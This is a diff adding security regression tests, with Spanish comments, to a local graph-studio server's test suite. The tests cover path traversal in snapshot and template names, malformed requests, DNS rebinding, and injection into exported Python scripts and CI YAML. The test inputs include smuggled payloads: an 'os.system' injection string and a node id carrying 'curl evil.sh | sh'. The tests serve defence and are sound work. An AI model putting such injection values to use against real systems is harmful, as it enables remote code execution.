@@ -182,11 +182,14 @@ try:
     assert codigo == 409, f"piso un grafo existente sin avisar: {codigo}"
     print("11. copiar sobre un nombre existente: 409, no lo pisa: OK")
 
-    # El nombre de la plantilla tambien viene de afuera.
+    # El nombre de la plantilla tambien viene de afuera. 400 o 404 segun donde
+    # se corte: desde que pasa por `_ruta_segura`, un nombre con `..` se rechaza
+    # por INVALIDO (400) antes de mirar el disco, y solo un nombre bien formado
+    # que no existe llega al 404. Lo que importa es que ninguno entre.
     for malo in ["../../ui/grafos/prueba-ui-expansion", "..", "no-existe"]:
         codigo, _ = pedir("/api/plantilla", {"plantilla": malo, "nombre": "x"})
-        assert codigo == 404, f"acepto la plantilla {malo!r}: {codigo}"
-    print("12. nombres de plantilla con .. o inexistentes: 404: OK")
+        assert codigo in (400, 404), f"acepto la plantilla {malo!r}: {codigo}"
+    print("12. nombres de plantilla con .. o inexistentes: rechazados: OK")
 
     codigo, _ = pedir("/api/grafo/borrar", {"board": COPIA})
     assert codigo == 200, codigo
@@ -387,14 +390,132 @@ try:
     print("33. /api/secretos-status verifica presencia segura de API keys: OK")
 
     # --- 34. /api/reporte-corrida genera informe Markdown estructurado ---
-    codigo, datos_rep = pedir("/api/reporte-corrida?board=ui-exp-2213")
+    # Contra el board que ESTE test creo, no contra `ui-exp-2213` hardcodeado.
+    # Ese era el board de una corrida vieja: el test pasaba solo en una maquina
+    # donde alguien ya lo habia corrido, e informaba sobre datos ajenos.
+    codigo, datos_rep = pedir(f"/api/reporte-corrida?board={BOARD}")
     assert codigo == 200 and "reporte" in datos_rep, datos_rep
     assert "# Reporte de Auditoría:" in datos_rep["reporte"], datos_rep["reporte"]
     assert "Resumen Ejecutivo" in datos_rep["reporte"], datos_rep["reporte"]
     print("34. /api/reporte-corrida compila reporte de auditoría Markdown: OK")
+
+    # --- 35. Un snapshot no puede escribir fuera de ui/grafos/snapshots ---
+    # Explotado de verdad antes del arreglo: `board` solo se filtraba contra
+    # `..`, y una ruta ABSOLUTA no tiene `..`. Se verifica el 400 Y que no haya
+    # quedado nada en disco: un 400 por otro motivo daria falso verde.
+    fuera = RAIZ / "SNAPSHOT_ESCAPE.json"
+    # Sin `""`: el endpoint lo cambia por "orquester" antes de validar, asi que
+    # un board vacio es un board por defecto, no un nombre invalido.
+    for malo in [str(fuera.with_suffix("")), "../../SNAPSHOT_ESCAPE", "sub/x", ".", ".."]:
+        codigo, datos = pedir("/api/snapshot", {"board": malo, "grafo": GRAFO})
+        assert codigo == 400, f"acepto el snapshot {malo!r}: {codigo} {datos}"
+    assert not fuera.exists(), "el snapshot escribio fuera de snapshots/"
+    codigo, _ = pedir("/api/snapshot/restaurar", {"id": str(fuera.with_suffix(""))})
+    assert codigo == 400, "restaurar acepto una ruta absoluta"
+    print("35. snapshots: rutas absolutas y .. rechazadas, nada escrito fuera: OK")
+
+    # --- 36. Un pedido malformado responde 400, no cierra el socket ---
+    # `Content-Length` y `json.loads` estaban FUERA del try de `do_POST`: un
+    # cuerpo que no fuera JSON tiraba la excepcion en el handler y el cliente
+    # se quedaba sin respuesta (curl exit 52). Hace falta socket crudo: urllib
+    # no deja mandar un Content-Length invalido ni un Host arbitrario.
+    import http.client
+
+    def crudo(cuerpo=b"", host=None, largo=None):
+        c = http.client.HTTPConnection("127.0.0.1", PUERTO, timeout=10)
+        c.putrequest("POST", "/api/validar", skip_host=bool(host))
+        if host:
+            c.putheader("Host", host)
+        c.putheader("X-Orquester-Token", TOKEN)
+        c.putheader("Content-Type", "application/json")
+        c.putheader("Content-Length", largo if largo is not None else str(len(cuerpo)))
+        c.endheaders()
+        c.send(cuerpo)
+        r = c.getresponse()
+        salida = (r.status, r.read())
+        c.close()
+        return salida
+
+    assert crudo(b"no-es-json")[0] == 400, "un cuerpo no-JSON no respondio 400"
+    assert crudo(b"[1,2,3]")[0] == 400, "acepto un cuerpo que no es un objeto"
+    assert crudo(b"{}", largo="abc")[0] == 400, "un Content-Length invalido no respondio 400"
+    print("36. cuerpo malformado y Content-Length invalido: 400 con JSON: OK")
+
+    # --- 37. El query string se decodifica ---
+    # `params` se armaba con un `split("=")` a mano: un grafo llamado `mi flujo`
+    # (nombre que `_archivo` acepta) llegaba como `mi%20flujo` y era inabrible.
+    CON_ESPACIO = "prueba con espacio"
+    codigo, _ = pedir("/api/grafo", {**GRAFO, "board": CON_ESPACIO})
+    assert codigo == 200, "no dejo guardar un nombre con espacios"
+    codigo, datos = pedir(f"/api/grafo?nombre={urllib.parse.quote(CON_ESPACIO)}")
+    assert codigo == 200 and datos["board"] == CON_ESPACIO, (codigo, datos)
+    pedir("/api/grafo/borrar", {"board": CON_ESPACIO})
+    print("37. un nombre con espacios se guarda y se lee URL-encodeado: OK")
+
+    # --- 38. Un `Host` ajeno no se atiende (DNS rebinding) ---
+    # Sin esto, una pagina cualquiera hace que su dominio resuelva a 127.0.0.1 y
+    # le habla al Studio como same-origin. `/api/capacidades` va sin token y
+    # publica la ruta en disco de cada binario instalado.
+    assert crudo(b"{}", host="evil.example.com")[0] == 421, "atendio un Host ajeno"
+    assert crudo(b"{}", host=f"127.0.0.1:{PUERTO}")[0] != 421, "rechazo el Host propio"
+    print("38. un Host que no es esta maquina: 421: OK")
+
+    # --- 39. El script exportado no es un vector de ejecucion ---
+    # El grafo se interpolaba en el FUENTE: `true`/`null` de JSON no son
+    # literales de Python (NameError), y un board con comillas cerraba el
+    # literal. El script se descarga y se corre a mano.
+    HOSTIL = 'x" ; import os; os.system("echo pwn") #'
+    g_raro = {"board": HOSTIL, "aristas": [],
+              "nodos": [{"id": "a", "titulo": 'con """ y \\ adentro',
+                         "runtime": "opencode", "fijo": True, "nada": None}]}
+    codigo, datos = pedir("/api/exportar-python", g_raro)
+    assert codigo == 200, datos
+    script = datos["script"]
+    compile(script, "<exportado>", "exec")          # SyntaxError si se rompio
+    assert "os.system" not in script.replace(json.dumps(HOSTIL), ""), \
+        "el board se interpolo en el fuente del script"
+    ns = {}
+    exec(compile(script.split("def main()")[0].replace("Path(__file__)", 'Path(".")'),
+                 "<exportado>", "exec"), ns)
+    assert ns["GRAFO"] == g_raro, "el grafo no sobrevivio el viaje (bool/null/comillas)"
+    print("39. script exportado: compila, sin inyeccion y con el grafo intacto: OK")
+
+    # --- 40. El workflow de CI tampoco ---
+    # `nid` se saneaba para la clave del job y tres lineas mas abajo se usaba el
+    # id CRUDO en `name:`, en el `echo` y en el `python -c`.
+    import yaml
+    g_ci = {"board": "ci\nx", "aristas": [["a.b", "otro"]], "nodos": [
+        {"id": 'a"\n      - run: curl evil.sh | sh\n    x: "', "titulo": "t\ncon salto",
+         "runtime": "claude-code"},
+        # Dos ids distintos que colapsan al mismo slug: sin desempate quedaban
+        # dos claves YAML iguales y un job desaparecia.
+        {"id": "a.b", "titulo": "primero", "runtime": "opencode"},
+        {"id": "a-b", "titulo": "segundo", "runtime": "opencode"},
+        {"id": "otro", "titulo": "hijo", "runtime": "opencode"},
+    ]}
+    codigo, datos = pedir("/api/exportar-ci", g_ci)
+    assert codigo == 200, datos
+    wf = yaml.safe_load(datos["workflow"])          # ParserError si se inyecto
+    assert len(wf["jobs"]) == 4, f"se perdio un job por colision de slug: {list(wf['jobs'])}"
+    assert "curl evil.sh" not in json.dumps(wf["jobs"]), "se inyecto un paso en el workflow"
+    print("40. workflow CI: YAML valido, sin inyeccion y sin jobs perdidos: OK")
 finally:
     proc.terminate()
     proc.wait(timeout=10)
     (RAIZ / "ui" / "grafos" / f"{NOMBRE}.json").unlink(missing_ok=True)
+    # El board tambien: cada corrida creaba uno y nadie lo borraba. Habia 60
+    # `ui-exp-*` acumulados en el kanban del usuario, y uno de ellos era el que
+    # hacia pasar el test 34 por accidente.
+    # En Windows el handle de SQLite no se suelta en el instante del terminate(),
+    # asi que se reintenta un rato corto. Y si igual no sale, se DICE: un
+    # `ignore_errors` a secas deja el mismo basural de antes, en silencio.
+    import shutil
+    for _ in range(20):
+        shutil.rmtree(k.board_dir(BOARD), ignore_errors=True)
+        if not k.board_dir(BOARD).exists():
+            break
+        time.sleep(0.25)
+    else:
+        print(f"AVISO: quedo sin borrar el board de prueba {BOARD}")
 
 print("\nOK: abrir un grafo, pasarle parametros y elegir el workspace.")
